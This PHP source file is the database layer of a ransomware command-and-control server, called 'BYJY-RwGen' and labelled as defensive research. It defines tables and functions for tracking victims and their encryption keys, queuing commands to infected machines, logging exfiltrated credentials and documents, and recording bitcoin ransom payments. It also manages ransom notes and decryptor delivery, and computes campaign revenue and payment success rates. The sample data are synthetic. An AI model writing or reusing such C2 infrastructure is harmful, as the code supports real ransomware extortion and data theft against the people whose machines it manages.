<?php
/**
 * BYJY-RwGen Database Manager
 * SQLite database operations for C&C server
 * For defensive cybersecurity research purposes only
 */

class Database {
    private $db;
    private $dbFile = 'research_c2.db';
    
    public function __construct() {
        $this->initializeDatabase();
    }
    
    private function initializeDatabase() {
        try {
            $this->db = new PDO('sqlite:' . $this->dbFile);
            $this->db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
            
            $this->createTables();
            $this->insertSampleData();
            
        } catch (PDOException $e) {
            error_log("Database initialization error: " . $e->getMessage());
            throw new Exception("Failed to initialize research database");
        }
    }
    
    private function createTables() {
        $sql = "
            CREATE TABLE IF NOT EXISTS victims (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT UNIQUE NOT NULL,
                hostname TEXT NOT NULL,
                ip_address TEXT,
                os_version TEXT,
                domain TEXT,
                cpu_count INTEGER,
                memory_gb REAL,
                disk_space_gb REAL,
                antivirus TEXT,
                firewall TEXT,
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_heartbeat DATETIME DEFAULT CURRENT_TIMESTAMP,
                status TEXT DEFAULT 'active',
                country TEXT,
                encryption_key TEXT,
                files_encrypted INTEGER DEFAULT 0,
                ransom_amount REAL DEFAULT 0,
                payment_status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );
            
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT NOT NULL,
                command TEXT NOT NULL,
                parameters TEXT,
                status TEXT DEFAULT 'pending',
                sent_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                executed_at DATETIME,
                result TEXT,
                FOREIGN KEY (victim_id) REFERENCES victims(victim_id)
            );
            
            CREATE TABLE IF NOT EXISTS payments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT NOT NULL,
                bitcoin_address TEXT NOT NULL,
                amount_btc REAL NOT NULL,
                amount_usd REAL,
                payment_received BOOLEAN DEFAULT 0,
                transaction_id TEXT,
                received_at DATETIME,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (victim_id) REFERENCES victims(victim_id)
            );
            
            CREATE TABLE IF NOT EXISTS exfiltrated_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT NOT NULL,
                data_type TEXT NOT NULL,
                file_path TEXT,
                file_size INTEGER,
                data_hash TEXT,
                exfiltrated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (victim_id) REFERENCES victims(victim_id)
            );
            
            CREATE TABLE IF NOT EXISTS campaign_config (
                id INTEGER PRIMARY KEY,
                campaign_name TEXT NOT NULL,
                ransom_note_template TEXT,
                bitcoin_wallet TEXT,
                c2_domain TEXT,
                encryption_algorithm TEXT,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );
            
            CREATE TABLE IF NOT EXISTS statistics (
                id INTEGER PRIMARY KEY,
                stat_name TEXT UNIQUE NOT NULL,
                stat_value TEXT NOT NULL,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
            );
            
            CREATE TABLE IF NOT EXISTS decryptor_downloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT NOT NULL,
                download_token TEXT UNIQUE NOT NULL,
                decryptor_generated BOOLEAN DEFAULT 0,
                download_count INTEGER DEFAULT 0,
                generated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_downloaded DATETIME,
                FOREIGN KEY (victim_id) REFERENCES victims(victim_id)
            );
            
            CREATE TABLE IF NOT EXISTS decryption_status (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                victim_id TEXT NOT NULL,
                status TEXT NOT NULL,
                metadata TEXT,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (victim_id) REFERENCES victims(victim_id)
            );
        ";
        
        $this->db->exec($sql);
    }
    
    private function insertSampleData() {
        // Check if sample data already exists
        $stmt = $this->db->prepare("SELECT COUNT(*) FROM victims");
        $stmt->execute();
        $count = $stmt->fetchColumn();
        
        if ($count > 0) {
            return; // Sample data already exists
        }
        
        // Insert sample research victims
        $sampleVictims = [
            [
                'victim_id' => 'research_victim_001',
                'hostname' => 'WIN-RESEARCH-01',
                'ip_address' => '192.168.1.100',
                'os_version' => 'Windows 11 Pro 22H2',
                'domain' => 'RESEARCH.LOCAL',
                'cpu_count' => 8,
                'memory_gb' => 16.0,
                'disk_space_gb' => 500.0,
                'antivirus' => 'Windows Defender',
                'firewall' => 'Windows Firewall',
                'country' => 'US',
                'encryption_key' => '0123456789abcdef0123456789abcdef',
                'files_encrypted' => 1250,
                'ransom_amount' => 0.5,
                'status' => 'active'
            ],
            [
                'victim_id' => 'research_victim_002',
                'hostname' => 'UBUNTU-RESEARCH-02',
                'ip_address' => '192.168.1.101',
                'os_version' => 'Ubuntu 22.04 LTS',
                'domain' => null,
                'cpu_count' => 4,
                'memory_gb' => 8.0,
                'disk_space_gb' => 250.0,
                'antivirus' => 'ClamAV',
                'firewall' => 'UFW',
                'country' => 'CA',
                'encryption_key' => 'fedcba9876543210fedcba9876543210',
                'files_encrypted' => 850,
                'ransom_amount' => 0.3,
                'status' => 'active'
            ],
            [
                'victim_id' => 'research_victim_003',
                'hostname' => 'WIN-SERVER-03',
                'ip_address' => '192.168.1.102',
                'os_version' => 'Windows Server 2022',
                'domain' => 'CORP.RESEARCH.LOCAL',
                'cpu_count' => 16,
                'memory_gb' => 32.0,
                'disk_space_gb' => 2000.0,
                'antivirus' => 'Microsoft Defender for Business',
                'firewall' => 'Windows Advanced Firewall',
                'country' => 'GB',
                'encryption_key' => 'abcdef0123456789abcdef0123456789',
                'files_encrypted' => 5400,
                'ransom_amount' => 2.0,
                'status' => 'inactive',
                'last_heartbeat' => date('Y-m-d H:i:s', strtotime('-2 hours'))
            ]
        ];
        
        $stmt = $this->db->prepare("
            INSERT INTO victims (
                victim_id, hostname, ip_address, os_version, domain, 
                cpu_count, memory_gb, disk_space_gb, antivirus, firewall,
                country, encryption_key, files_encrypted, ransom_amount, status, last_heartbeat
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ");
        
        foreach ($sampleVictims as $victim) {
            $stmt->execute([
                $victim['victim_id'], $victim['hostname'], $victim['ip_address'],
                $victim['os_version'], $victim['domain'], $victim['cpu_count'],
                $victim['memory_gb'], $victim['disk_space_gb'], $victim['antivirus'],
                $victim['firewall'], $victim['country'], $victim['encryption_key'],
                $victim['files_encrypted'], $victim['ransom_amount'], $victim['status'],
                $victim['last_heartbeat'] ?? date('Y-m-d H:i:s')
            ]);
        }
        
        // Insert sample payments
        $samplePayments = [
            [
                'victim_id' => 'research_victim_001',
                'bitcoin_address' => 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
                'amount_btc' => 0.5,
                'amount_usd' => 15000.0,
                'payment_received' => 0
            ],
            [
                'victim_id' => 'research_victim_002',
                'bitcoin_address' => 'bc1qzx3vw4rd8tq5f7n8e9u2y1i0p3s6d9f2g5h8j1k',
                'amount_btc' => 0.3,
                'amount_usd' => 9000.0,
                'payment_received' => 1,
                'transaction_id' => 'research_tx_001',
                'received_at' => date('Y-m-d H:i:s', strtotime('-1 day'))
            ]
        ];
        
        $stmt = $this->db->prepare("
            INSERT INTO payments (
                victim_id, bitcoin_address, amount_btc, amount_usd, 
                payment_received, transaction_id, received_at
            ) VALUES (?, ?, ?, ?, ?, ?, ?)
        ");
        
        foreach ($samplePayments as $payment) {
            $stmt->execute([
                $payment['victim_id'], $payment['bitcoin_address'], 
                $payment['amount_btc'], $payment['amount_usd'],
                $payment['payment_received'], $payment['transaction_id'] ?? null,
                $payment['received_at'] ?? null
            ]);
        }
        
        // Insert campaign configuration
        $this->db->exec("
            INSERT OR REPLACE INTO campaign_config (
                id, campaign_name, ransom_note_template, bitcoin_wallet, 
                c2_domain, encryption_algorithm
            ) VALUES (
                1, 
                'RESEARCH_CAMPAIGN_2024',
                'Your files have been encrypted for security research purposes.\n\nThis is a defensive cybersecurity research simulation.\nDO NOT ACTUALLY MAKE ANY PAYMENTS.\n\nContact: security-research@university.edu',
                'bc1qresearch0123456789abcdefghijklmnopqrstuvwxyz',
                'research-c2-server.local',
                'XChaCha20-Poly1305'
            )
        ");
        
        // Insert sample exfiltrated data
        $sampleExfilData = [
            [
                'victim_id' => 'research_victim_001',
                'data_type' => 'credentials',
                'file_path' => 'C:\\Users\\testuser\\Documents\\passwords.txt',
                'file_size' => 2048,
                'data_hash' => 'a1b2c3d4e5f6789012345678901234567890abcdef'
            ],
            [
                'victim_id' => 'research_victim_002',
                'data_type' => 'documents',
                'file_path' => '/home/user/important_docs.tar.gz',
                'file_size' => 1048576,
                'data_hash' => 'f1e2d3c4b5a698765432109876543210fedcba98'
            ]
        ];
        
        $stmt = $this->db->prepare("
            INSERT INTO exfiltrated_data (
                victim_id, data_type, file_path, file_size, data_hash
            ) VALUES (?, ?, ?, ?, ?)
        ");
        
        foreach ($sampleExfilData as $data) {
            $stmt->execute([
                $data['victim_id'], $data['data_type'], $data['file_path'],
                $data['file_size'], $data['data_hash']
            ]);
        }
    }
    
    public function getVictims() {
        $stmt = $this->db->prepare("
            SELECT * FROM victims 
            ORDER BY last_heartbeat DESC
        ");
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }
    
    public function getVictimDetails($victimId) {
        $stmt = $this->db->prepare("
            SELECT v.*, p.bitcoin_address, p.amount_btc, p.payment_received,
                   COUNT(e.id) as exfiltrated_files_count
            FROM victims v
            LEFT JOIN payments p ON v.victim_id = p.victim_id
            LEFT JOIN exfiltrated_data e ON v.victim_id = e.victim_id
            WHERE v.id = ?
            GROUP BY v.id
        ");
        $stmt->execute([$victimId]);
        return $stmt->fetch(PDO::FETCH_ASSOC);
    }
    
    public function getCommands($victimId = null) {
        if ($victimId) {
            $stmt = $this->db->prepare("
                SELECT c.*, v.hostname 
                FROM commands c
                JOIN victims v ON c.victim_id = v.victim_id
                WHERE c.victim_id = ?
                ORDER BY c.sent_at DESC
            ");
            $stmt->execute([$victimId]);
        } else {
            $stmt = $this->db->prepare("
                SELECT c.*, v.hostname 
                FROM commands c
                JOIN victims v ON c.victim_id = v.victim_id
                ORDER BY c.sent_at DESC
                LIMIT 100
            ");
            $stmt->execute();
        }
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }
    
    public function sendCommand($victimId, $command, $parameters) {
        try {
            $stmt = $this->db->prepare("
                INSERT INTO commands (victim_id, command, parameters)
                SELECT victim_id, ?, ? FROM victims WHERE id = ?
            ");
            $result = $stmt->execute([$command, $parameters, $victimId]);
            
            // Log command for research purposes
            error_log("Research C&C: Command '$command' sent to victim ID $victimId");
            
            return $result;
        } catch (PDOException $e) {
            error_log("Database error sending command: " . $e->getMessage());
            return false;
        }
    }
    
    public function getPayments() {
        $stmt = $this->db->prepare("
            SELECT p.*, v.hostname 
            FROM payments p
            JOIN victims v ON p.victim_id = v.victim_id
            ORDER BY p.created_at DESC
        ");
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }
    
    public function getTotalVictims() {
        $stmt = $this->db->prepare("SELECT COUNT(*) FROM victims");
        $stmt->execute();
        return $stmt->fetchColumn();
    }
    
    public function getActiveVictims() {
        $stmt = $this->db->prepare("
            SELECT COUNT(*) FROM victims 
            WHERE status = 'active' 
            AND last_heartbeat > datetime('now', '-30 minutes')
        ");
        $stmt->execute();
        return $stmt->fetchColumn();
    }
    
    public function getTotalPayments() {
        $stmt = $this->db->prepare("SELECT COUNT(*) FROM payments WHERE payment_received = 1");
        $stmt->execute();
        return $stmt->fetchColumn();
    }
    
    public function getTotalRevenue() {
        $stmt = $this->db->prepare("SELECT SUM(amount_usd) FROM payments WHERE payment_received = 1");
        $stmt->execute();
        return $stmt->fetchColumn() ?: 0;
    }
    
    public function getSuccessRate() {
        $totalVictims = $this->getTotalVictims();
        $paidVictims = $this->getTotalPayments();
        
        if ($totalVictims == 0) return 0;
        return round(($paidVictims / $totalVictims) * 100, 1);
    }
    
    public function getAveragePaymentTime() {
        $stmt = $this->db->prepare("
            SELECT AVG(
                (julianday(p.received_at) - julianday(v.first_seen)) * 24
            ) as avg_hours
            FROM payments p
            JOIN victims v ON p.victim_id = v.victim_id
            WHERE p.payment_received = 1
        ");
        $stmt->execute();
        return round($stmt->fetchColumn() ?: 0, 1);
    }
    
    public function getRansomNote() {
        $stmt = $this->db->prepare("SELECT ransom_note_template FROM campaign_config WHERE id = 1");
        $stmt->execute();
        $result = $stmt->fetchColumn();
        
        if (!$result) {
            return "Your files have been encrypted for security research purposes.\n\nThis is a defensive cybersecurity research simulation.\nDO NOT ACTUALLY MAKE ANY PAYMENTS.\n\nContact: security-research@university.edu";
        }
        
        return $result;
    }
    
    public function updateRansomNote($noteContent) {
        try {
            $stmt = $this->db->prepare("
                INSERT OR REPLACE INTO campaign_config 
                (id, campaign_name, ransom_note_template, updated_at)
                VALUES (1, 'RESEARCH_CAMPAIGN_2024', ?, datetime('now'))
            ");
            return $stmt->execute([$noteContent]);
        } catch (PDOException $e) {
            error_log("Database error updating ransom note: " . $e->getMessage());
            return false;
        }
    }
    
    public function getVictimDecryptionKey($victimId) {
        $stmt = $this->db->prepare("
            SELECT encryption_key FROM victims WHERE id = ?
        ");
        $stmt->execute([$victimId]);
        return $stmt->fetchColumn();
    }
    

    
    public function addVictim($victimData) {
        try {
            $stmt = $this->db->prepare("
                INSERT INTO victims (
                    victim_id, hostname, ip_address, os_version, domain,
                    cpu_count, memory_gb, disk_space_gb, antivirus, firewall,
                    country, encryption_key
                ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ");
            
            return $stmt->execute([
                $victimData['victim_id'], $victimData['hostname'], 
                $victimData['ip_address'], $victimData['os_version'],
                $victimData['domain'], $victimData['cpu_count'],
                $victimData['memory_gb'], $victimData['disk_space_gb'],
                $victimData['antivirus'], $victimData['firewall'],
                $victimData['country'], $victimData['encryption_key']
            ]);
            
        } catch (PDOException $e) {
            error_log("Database error adding victim: " . $e->getMessage());
            return false;
        }
    }
    
    public function updateVictimHeartbeat($victimId) {
        try {
            $stmt = $this->db->prepare("
                UPDATE victims 
                SET last_heartbeat = datetime('now'),
                    status = 'active'
                WHERE victim_id = ?
            ");
            return $stmt->execute([$victimId]);
            
        } catch (PDOException $e) {
            error_log("Database error updating heartbeat: " . $e->getMessage());
            return false;
        }
    }
    
    public function logExfiltratedData($victimId, $dataType, $filePath, $fileSize, $dataHash) {
        try {
            $stmt = $this->db->prepare("
                INSERT INTO exfiltrated_data 
                (victim_id, data_type, file_path, file_size, data_hash)
                VALUES (?, ?, ?, ?, ?)
            ");
            return $stmt->execute([$victimId, $dataType, $filePath, $fileSize, $dataHash]);
            
        } catch (PDOException $e) {
            error_log("Database error logging exfiltrated data: " . $e->getMessage());
            return false;
        }
    }
    
    public function getExfiltratedData($victimId = null) {
        if ($victimId) {
            $stmt = $this->db->prepare("
                SELECT e.*, v.hostname 
                FROM exfiltrated_data e
                JOIN victims v ON e.victim_id = v.victim_id
                WHERE e.victim_id = ?
                ORDER BY e.exfiltrated_at DESC
            ");
            $stmt->execute([$victimId]);
        } else {
            $stmt = $this->db->prepare("
                SELECT e.*, v.hostname 
                FROM exfiltrated_data e
                JOIN victims v ON e.victim_id = v.victim_id
                ORDER BY e.exfiltrated_at DESC
                LIMIT 100
            ");
            $stmt->execute();
        }
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }
    
    public function __destruct() {
        $this->db = null;
    }
    
    // ===== ENHANCED PAYMENT AND DECRYPTION METHODS =====
    
    public function getPendingPayments() {
        $stmt = $this->db->prepare("
            SELECT p.*, v.hostname 
            FROM payments p
            JOIN victims v ON p.victim_id = v.victim_id
            WHERE p.payment_received = 0
            ORDER BY p.created_at ASC
        ");
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }
    
    public function getVerifiedPaymentsWithoutDecryptors() {
        $stmt = $this->db->prepare("
            SELECT p.*, v.hostname 
            FROM payments p
            JOIN victims v ON p.victim_id = v.victim_id
            LEFT JOIN decryptor_downloads d ON p.victim_id = d.victim_id
            WHERE p.payment_received = 1 
            AND (d.decryptor_generated = 0 OR d.decryptor_generated IS NULL)
            ORDER BY p.received_at ASC
        ");
        $stmt->execute();
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }
    
    public function getVictimByVictimId($victim_id) {
        $stmt = $this->db->prepare("
            SELECT * FROM victims WHERE victim_id = ?
        ");
        $stmt->execute([$victim_id]);
        return $stmt->fetch(PDO::FETCH_ASSOC);
    }
    
    public function getPaymentByVictimId($victim_id) {
        $stmt = $this->db->prepare("
            SELECT * FROM payments WHERE victim_id = ?
        ");
        $stmt->execute([$victim_id]);
        return $stmt->fetch(PDO::FETCH_ASSOC);
    }
    
    public function markPaymentReceived($victim_id, $transaction_id = null) {
        try {
            // Update payment status with transaction ID
            $stmt = $this->db->prepare("
                UPDATE payments 
                SET payment_received = 1, 
                    received_at = datetime('now'),
                    transaction_id = ?
                WHERE victim_id = ?
            ");
            $stmt->execute([$transaction_id ?: 'research_simulation_' . time(), $victim_id]);
            
            // Update victim status
            $stmt = $this->db->prepare("
                UPDATE victims 
                SET payment_status = 'paid'
                WHERE victim_id = ?
            ");
            return $stmt->execute([$victim_id]);
            
        } catch (PDOException $e) {
            error_log("Database error marking payment: " . $e->getMessage());
            return false;
        }
    }
    
    public function storeDecryptorDownload($victim_id, $download_token) {
        try {
            $stmt = $this->db->prepare("
                INSERT OR REPLACE INTO decryptor_downloads 
                (victim_id, download_token, decryptor_generated, generated_at)
                VALUES (?, ?, 1, datetime('now'))
            ");
            return $stmt->execute([$victim_id, $download_token]);
        } catch (PDOException $e) {
            error_log("Database error storing decryptor download: " . $e->getMessage());
            return false;
        }
    }
    
    public function getDecryptorDownloadInfo($victim_id) {
        $stmt = $this->db->prepare("
            SELECT * FROM decryptor_downloads WHERE victim_id = ? AND decryptor_generated = 1
        ");
        $stmt->execute([$victim_id]);
        return $stmt->fetch(PDO::FETCH_ASSOC);
    }
    
    public function markDecryptorGenerated($victim_id) {
        try {
            $stmt = $this->db->prepare("
                INSERT OR REPLACE INTO decryptor_downloads 
                (victim_id, download_token, decryptor_generated, generated_at)
                VALUES (?, ?, 1, datetime('now'))
            ");
            $download_token = hash('sha256', $victim_id . time() . random_bytes(16));
            return $stmt->execute([$victim_id, $download_token]);
        } catch (PDOException $e) {
            error_log("Database error marking decryptor generated: " . $e->getMessage());
            return false;
        }
    }
    
    public function isDecryptorGenerated($victim_id) {
        $stmt = $this->db->prepare("
            SELECT decryptor_generated FROM decryptor_downloads 
            WHERE victim_id = ? AND decryptor_generated = 1
        ");
        $stmt->execute([$victim_id]);
        return $stmt->fetchColumn() ? true : false;
    }
    
    public function updateVictimStatus($victim_id, $status) {
        try {
            $stmt = $this->db->prepare("
                UPDATE victims SET status = ?, last_heartbeat = datetime('now')
                WHERE victim_id = ?
            ");
            return $stmt->execute([$status, $victim_id]);
        } catch (PDOException $e) {
            error_log("Database error updating victim status: " . $e->getMessage());
            return false;
        }
    }
    
    public function updateDecryptionStatus($victim_id, $status, $metadata = []) {
        try {
            $stmt = $this->db->prepare("
                INSERT INTO decryption_status (victim_id, status, metadata)
                VALUES (?, ?, ?)
            ");
            return $stmt->execute([$victim_id, $status, json_encode($metadata)]);
        } catch (PDOException $e) {
            error_log("Database error updating decryption status: " . $e->getMessage());
            return false;
        }
    }
    
    public function cleanupInactiveVictims($seconds) {
        try {
            $stmt = $this->db->prepare("
                UPDATE victims 
                SET status = 'inactive'
                WHERE last_heartbeat < datetime('now', '-' || ? || ' seconds')
                AND status = 'active'
            ");
            return $stmt->execute([$seconds]);
        } catch (PDOException $e) {
            error_log("Database error cleaning up victims: " . $e->getMessage());
            return false;
        }
    }
    
    public function getDecryptionStatistics($victim_id) {
        $stmt = $this->db->prepare("
            SELECT * FROM decryption_status 
            WHERE victim_id = ? 
            ORDER BY updated_at DESC
        ");
        $stmt->execute([$victim_id]);
        return $stmt->fetchAll(PDO::FETCH_ASSOC);
    }
}

// Initialize database for research purposes
if (basename($_SERVER['PHP_SELF']) == basename(__FILE__)) {
    echo "BYJY-RwGen Research Database\n";
    echo "Initializing research database...\n";
    
    try {
        $db = new Database();
        echo "✓ Database initialized successfully\n";
        echo "✓ Sample research data inserted\n";
        echo "✓ Ready for defensive cybersecurity research\n\n";
        
        echo "Statistics:\n";
        echo "- Total Victims: " . $db->getTotalVictims() . "\n";
        echo "- Active Victims: " . $db->getActiveVictims() . "\n";
        echo "- Total Payments: " . $db->getTotalPayments() . "\n";
        echo "- Success Rate: " . $db->getSuccessRate() . "%\n";
        
    } catch (Exception $e) {
        echo "✗ Database initialization failed: " . $e->getMessage() . "\n";
    }
    
    echo "\n⚠️ This database contains synthetic data for research purposes only!\n";
}
?>
